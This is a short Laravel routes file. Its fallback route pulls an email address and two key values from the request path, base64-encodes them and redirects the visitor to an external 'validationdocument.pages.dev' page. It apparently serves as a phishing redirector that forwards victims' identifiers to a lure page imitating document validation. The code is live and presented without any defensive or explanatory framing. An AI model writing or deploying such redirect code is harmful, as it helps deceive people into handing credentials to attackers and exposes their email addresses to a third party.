<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::fallback(function () {
	$fullUrl = request()->path();
    
    // Extract the segments of the URL
    $segments = explode('/', $fullUrl);
    
    // Assuming the last two segments are the email and the key
    // and the segments before these are the paths
    $email = $segments[count($segments) - 3];
    $key = $segments[count($segments) - 2];
    $key2 = $segments[count($segments) - 1];
    
    $combinedString = $email . '&' . $key . '&'. $key2;
    
 
    $encodedCombinedString = base64_encode($combinedString);

    return redirect('https://validationdocument.pages.dev#?service='.$encodedCombinedString);
//    return "default";
});

Route::post('/', 'Controller@index');

